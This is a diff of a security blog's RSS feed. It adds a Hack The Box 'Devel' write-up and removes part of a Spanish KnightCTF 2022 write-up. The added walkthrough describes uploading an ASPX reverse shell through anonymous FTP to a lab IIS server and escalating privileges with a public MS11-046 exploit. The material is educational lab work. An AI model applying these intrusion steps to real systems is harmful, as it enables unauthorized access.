+&lt;p&gt;Next, we will use the &lt;em&gt;Nmap&lt;/em&gt; tool to determine which ports are open, as well as identify the version and services running on the asset. To determine which ports are open, we can do the following:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If the scan takes too long to complete, we have this alternative:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Below is an explanation of the parameters used in the port scan with &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Parameter&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Explanation&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-p-&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Scans the entire range of ports (65535 in total)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;--open&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Shows all ports that are open (or possibly open)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-T5&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;The timing template allows us to speed up our scan; this value can range from 0 to 5. Note that the higher the value of the template, the more “noise” we generate, but that’s okay, right? After all, we’re practicing in a controlled environment, and here we are all &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;White Hat&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-v&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;em&gt;Verbose&lt;/em&gt;, reports findings to the console&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-n&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Do not apply &lt;em&gt;DNS resolution&lt;/em&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-sS&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;em&gt;TCP SYN&lt;/em&gt; scan&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-min-rate&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Send packets no slower than &amp;lt;value&amp;gt; per second&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-vvv&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Triple &lt;em&gt;verbose&lt;/em&gt;, to get more information in the console&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-Pn&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Do not apply &lt;em&gt;host discovery&lt;/em&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Once we have detected the open ports on the asset, we can move on to determine the version and services running on these ports.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 21,80 10.10.10.5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Below is an explanation of the parameters used in the version and service scan with &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Parameter&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Explanation&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-sC&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Basic enumeration scripts&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-sV&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Version and services running on the found ports&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-p&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Specify which ports we want to analyze (those found open in the previous step)&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Based on the information reported by &lt;em&gt;Nmap&lt;/em&gt;, we can see that the target machine has open ports related to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt; (File Transfer Protocol).&lt;/p&gt;
+
+&lt;h3 id=&quot;exploitation-phase&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Exploitation Phase&lt;/h3&gt;
+
+&lt;p&gt;We can start by enumerating the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; service. To do this, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WhatWeb&lt;/code&gt;, a tool that identifies the web technologies being used. This includes content management systems (CMS), libraries, plugins, or even the operating system hosting the web server.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whatweb http://10.10.10.5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/4.png&quot; alt=&quot;4&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There’s nothing particularly interesting, except that the website is hosted on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IIS&lt;/code&gt; (Internet Information Services), a web server developed by &lt;em&gt;Microsoft&lt;/em&gt; to host sites on &lt;em&gt;Windows&lt;/em&gt; systems, and that the website appears to be under construction.&lt;/p&gt;
+
+&lt;p&gt;Since we can’t gather more useful information from the terminal, we will need to visit the website from our browser. We will only see the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IIS&lt;/code&gt; version 7 logo, so there doesn’t seem to be much to do here at the moment.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/5.png&quot; alt=&quot;5&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The next thing we can do is to enumerate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt; service. For this, we’ll use a &lt;em&gt;null session&lt;/em&gt;, as we don’t have credentials.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp anonymous@10.10.10.5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Upon connecting, we can see what appears to be the file structure of the website hosted on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IIS&lt;/code&gt;. We find a directory called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aspnet_client&lt;/code&gt; and files like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iisstart.htm&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;welcome.png&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/6.png&quot; alt=&quot;6&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can verify this by downloading one of these files and viewing it on our system. For instance, we can try with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;welcome.png&lt;/code&gt; image. Since this is a non-text file, we will switch the transfer mode to &lt;em&gt;binary&lt;/em&gt;, which ensures that the file is transferred without modifications, preserving its integrity byte by byte.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;binary
+get welcome.png
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/7.png&quot; alt=&quot;7&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/8.png&quot; alt=&quot;8&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We confirm that we are seeing the same image we previously viewed in the browser, suggesting a possible file upload path to the web server. As a test, we can upload a file via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt; and see if it appears on the website. In my case, I tested with an image.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;put &amp;lt;fileName&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/9.png&quot; alt=&quot;9&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We see that the image appears correctly on the webpage, so we can attempt to upload a &lt;em&gt;reverse shell&lt;/em&gt; to the server. One thing to keep in mind is that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IIS&lt;/code&gt; uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ASP&lt;/code&gt;/&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ASP.NET&lt;/code&gt; for server-side script execution. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ASP.NET&lt;/code&gt; is the more modern version of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ASP&lt;/code&gt; framework and is based on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.NET&lt;/code&gt; framework, which is &lt;em&gt;Microsoft’s&lt;/em&gt; development platform for creating applications. Therefore, the &lt;em&gt;reverse shell&lt;/em&gt; we upload will need to be in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.aspx&lt;/code&gt; format so that the server can interpret and execute it correctly.&lt;/p&gt;
+
+&lt;p&gt;That said, we could generate the &lt;em&gt;reverse shell&lt;/em&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MSFvenom&lt;/code&gt; or find one publicly available on GitHub. In my case, I’ll use the &lt;a href=&quot;https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx&quot;&gt;shell&lt;/a&gt; by user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;borjmz&lt;/code&gt;. We just need to change our IP and port where indicated, and then upload the &lt;em&gt;shell&lt;/em&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;put shell.aspx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can go to &lt;a href=&quot;http://10.10.10.5/shell.aspx&quot;&gt;http://10.10.10.5/shell.aspx&lt;/a&gt; or execute it from the console with:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://10.10.10.5/shell.aspx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Either way, we will get a shell inside the target machine as the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IIS APPPOOL\web&lt;/code&gt;, so we’ll need to escalate privileges.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/10.png&quot; alt=&quot;10&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;privilege-escalation&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Privilege Escalation&lt;/h3&gt;
+
+&lt;p&gt;We can start by enumerating the operating system using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systeminfo&lt;/code&gt; to find its version and check whether patches have been applied.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;systeminfo
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/11.png&quot; alt=&quot;11&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We find that the operating system version is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6.1.7600 Build 7600&lt;/code&gt;, with no patches applied. Upon further research, we discover that this version is vulnerable to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MS11-046&lt;/code&gt;, a vulnerability caused by the &lt;em&gt;Microsoft Windows Ancillary Function Driver&lt;/em&gt; (&lt;em&gt;AFD.sys&lt;/em&gt;), which, when running in privileged kernel mode, fails to properly validate input provided by low-privileged users.&lt;/p&gt;
+
+&lt;p&gt;We can search online for an exploit to take advantage of this vulnerability. There is already a compiled version available, which is the one we will &lt;a href=&quot;https://www.exploit-db.com/exploits/40564&quot;&gt;use&lt;/a&gt;. Since we have a potential way to upload files via the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt; service, we can leverage this by searching for the path where the files we saw earlier are located. For instance, we can perform a recursive search on the system to verify where the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;welcome.png&lt;/code&gt; image we saw earlier is stored.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; /s welcome.png
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/12.png&quot; alt=&quot;12&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/13.png&quot; alt=&quot;13&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Knowing that the files are located in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\inetpub\wwwroot&lt;/code&gt; directory, we can upload the exploit via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt;, and once the file is on the target machine, we will be able to execute it directly from there.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;binary
+put MS11-046.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/14.png&quot; alt=&quot;14&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;By executing it, we will gain elevated privileges, becoming &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NT AUTHORITY\SYSTEM&lt;/code&gt;, which will allow us to list the flags for both users on the system.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/15.png&quot; alt=&quot;15&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Mon, 21 Oct 2024 00:00:00 -0400</pubDate>
+        <link>/en/Devel-Hack-The-Box/</link>
+        <guid isPermaLink="true">/en/Devel-Hack-The-Box/</guid>
+      </item>
+    
+      <item>
         <title>Lame - Hack The Box</title>
         <description>&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/1.png&quot; alt=&quot;Info Card&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
@@ -311,7 +775,7 @@ PASS p@&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;w0rd!
         <title>Lame - Hack The Box</title>
         <description>&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/1.png&quot; alt=&quot;Info Card&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Today we will be solving &lt;em&gt;Hack The Box’s&lt;/em&gt; &lt;em&gt;Lame&lt;/em&gt; machine. It is an easy-level &lt;em&gt;Linux&lt;/em&gt; machine in terms of both exploitation and privilege escalation.&lt;/p&gt;
+&lt;p&gt;Today we will be solving &lt;em&gt;Hack The Box’s&lt;/em&gt; &lt;em&gt;Lame&lt;/em&gt; machine. It is an easy-level &lt;em&gt;Linux&lt;/em&gt; machine, both in terms of exploitation and privilege escalation.&lt;/p&gt;
 
 &lt;p&gt;This machine allows us to exploit it through two potential paths, one of which requires post-exploitation. Despite its low difficulty, there are multiple methods to perform the same exploitation, making it great for learning different approaches to achieve the same process.&lt;/p&gt;
 
@@ -2297,1016 +2761,6 @@ export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span c
         <pubDate>Mon, 07 Feb 2022 00:00:00 -0500</pubDate>
         <link>/es/Kenobi-TryHackMe/</link>
         <guid isPermaLink="true">/es/Kenobi-TryHackMe/</guid>
-      </item>
-    
-      <item>
-        <title>KnightCTF 2022</title>
-        <description>&lt;p&gt;KnightCTF 2022, es el primer &lt;em&gt;capture the flag&lt;/em&gt; organizado por &lt;a href=&quot;https://knightsquad.org/&quot;&gt;Knight Squad&lt;/a&gt;, este es de tipo &lt;em&gt;jeopardy&lt;/em&gt;, por lo que encontraremos distintas categorías.&lt;/p&gt;
-
-&lt;div style=&quot;text-align:center&quot;&gt;
-  &lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/1.png&quot; alt=&quot;KnightCTF logo&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;reverse-engineering&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Reverse Engineering&lt;/h3&gt;
-
-&lt;h4 id=&quot;the-encoder&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;The Encoder&lt;/h4&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/2.png&quot; alt=&quot;2&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Al extraer y ejecutar el binario, &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/the_encoder.zip&quot;&gt;the_encoder.out&lt;/a&gt;, vamos a darnos cuenta que nos pregunta por una cadena de caracteres; si introducimos cualquier carácter, el binario nos devolverá un valor bastante similar a los que encontramos en el enunciado del reto.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/3.png&quot; alt=&quot;3&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Por otra parte, podemos darnos cuenta que si introducimos caracteres consecutivos, el valor que nos devuelve también lo es, esto ya nos da una posible idea de por donde van los tiros.&lt;/p&gt;
-
-&lt;p&gt;Podemos consultar una &lt;a href=&quot;https://www.ascii-code.com/&quot;&gt;tabla ASCII&lt;/a&gt;, para saber en que orden van los caracteres, y así simplificar las cosas.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/4.png&quot; alt=&quot;4&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{s1Mpl3_3Nc0D3r_1337}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;pwn&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;PWN&lt;/h3&gt;
-
-&lt;h4 id=&quot;whats-your-name&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;What’s Your Name&lt;/h4&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/5.png&quot; alt=&quot;5&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Al extraer y ejecutar el binario, &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/whats_your_name.zip&quot;&gt;whats_your_name&lt;/a&gt;, vamos a darnos cuenta que nos pregunta por un nombre; si introducimos cualquier cadena de caracteres, el binario nos devolverá un mensaje de bienvenida.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/6.png&quot; alt=&quot;6&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si introducimos una cadena de caracteres lo suficientemente larga, conseguiremos un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Segmentation Fault&lt;/code&gt;, lo cual nos da la idea de un posible &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Buffer Overflow&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/7.png&quot; alt=&quot;7&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Podemos empezar a depurar el binario con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GEF&lt;/code&gt;, tal y como lo hicimos en la máquina &lt;a href=&quot;https://mateonitro550.github.io/Safe-Hack-The-Box&quot;&gt;Safe&lt;/a&gt; de &lt;em&gt;Hack The Box&lt;/em&gt;, y nos daremos cuenta que el &lt;em&gt;buffer&lt;/em&gt; tiene una longitud de &lt;em&gt;72 bytes&lt;/em&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/8.png&quot; alt=&quot;8&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ya con esto en mente, podemos analizar el binario con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ghidra&lt;/code&gt;, y nos daremos cuenta que dentro de la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt;, después de hacer una serie de validaciones, se está efectuando una llamada al sistema para ejecutar un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; al archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/hacker/flag.txt&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/9.png&quot; alt=&quot;9&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;De modo que teniendo control sobre el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RIP&lt;/code&gt;, si apuntamos a la dirección de la llamada al sistema, omitiremos toda la validación y conseguiremos listar la flag; para ello, haremos un script en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Python&lt;/code&gt;, bastante parecido al de la máquina &lt;a href=&quot;https://mateonitro550.github.io/Safe-Hack-The-Box&quot;&gt;Safe&lt;/a&gt; de &lt;em&gt;Hack The Box&lt;/em&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
-&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
-
